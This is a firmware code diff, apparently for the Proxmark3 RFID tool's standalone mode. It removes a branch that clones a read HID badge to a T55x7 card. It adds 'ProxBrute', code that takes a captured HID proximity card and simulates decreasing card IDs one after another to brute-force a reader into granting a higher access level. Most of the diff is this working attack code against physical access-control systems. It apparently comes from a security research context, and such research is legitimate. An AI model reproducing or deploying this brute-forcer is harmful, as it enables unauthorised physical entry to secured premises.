@@ -655,7 +655,9 @@ void SamyRun()
 	int selected = 0;
 	int playing = 0;
 	int cardRead = 0;
-
+	// ProxBrute Stuff:
+	unsigned int i;
+	unsigned int ZERO=0x00000000;
 	// Turn on selected LED
 	LED(selected + 1, 0);
 
@@ -700,37 +702,6 @@ void SamyRun()
 	
 		}
 
-		else if (button_pressed > 0 && cardRead == 1)
-		{
-					LEDsoff();
-					LED(selected + 1, 0);
-					LED(LED_ORANGE, 0);
-
-					// record
-					Dbprintf("Cloning %x %x%08x", selected, high[selected], low[selected]);
-
-					// wait for button to be released
-					while(BUTTON_PRESS())
-						WDT_HIT();
-
-					/* need this delay to prevent catching some weird data */
-					SpinDelay(500);
-
-					CopyHIDtoT55x7(0, high[selected], low[selected], 0);
-					Dbprintf("Cloned %x %x%08x", selected, high[selected], low[selected]);
-
-					LEDsoff();
-					LED(selected + 1, 0);
-					// Finished recording
-
-					// If we were previously playing, set playing off
-					// so next button push begins playing what we recorded
-					playing = 0;
-					
-					cardRead = 0;
-			
-		}
-
 		// Change where to record (or begin playing)
 		else if (button_pressed)
 		{
@@ -750,9 +721,47 @@ void SamyRun()
 				// wait for button to be released
 				while(BUTTON_PRESS())
 					WDT_HIT();
-				Dbprintf("%x %x%08x", selected, high[selected], low[selected]);
-				CmdHIDsimTAG(high[selected], low[selected], 0);
-				DbpString("Done playing");
+/* START PROXBRUTE */
+
+/*
+       ProxBrute - brad a. - foundstone
+
+       Following code is a trivial brute forcer once you read a valid tag
+       the idea is you get a valid tag, then just try and brute force to
+       another priv level. The problem is that it has no idea if the code
+       worked or not, so its a crap shoot. One option is to time how long
+       it takes to get a valid ID then start from scratch every time.
+*/
+
+                               if ( selected == 1 ) {
+                                       DbpString("Entering ProxBrute Mode");
+                                       DbpString("brad a. - foundstone");
+                                       Dbprintf("Current Tag: Selected = %x Facility = %08x ID = %08x", selected, high[selected], low[selected]);
+                                       LED(LED_ORANGE,0);
+                                       LED(LED_RED,0);
+                                       for (i=low[selected]-1;i>ZERO;i--) {
+                                               if(BUTTON_PRESS()) {
+                                                       DbpString("Told to Stop");
+                                                       break;
+                                               }
+
+                                               Dbprintf("Trying Facility = %08x ID %08x", high[selected], i);
+                                               CmdHIDsimTAGProxBrute(high[selected], i, 0);
+                                               SpinDelay(500);
+                                       }
+
+                               } else {
+                                       DbpString("Red is lit, not entering ProxBrute Mode");
+                                       Dbprintf("%x %x %x", selected, high[selected], low[selected]);
+                                       CmdHIDsimTAG(high[selected], low[selected], 0);
+                                       DbpString("Done playing");
+                               }
+
+
+
+
+/*   END PROXBRUTE */
+
 				if (BUTTON_HELD(1000) > 0)
 					{
 					DbpString("Exiting");
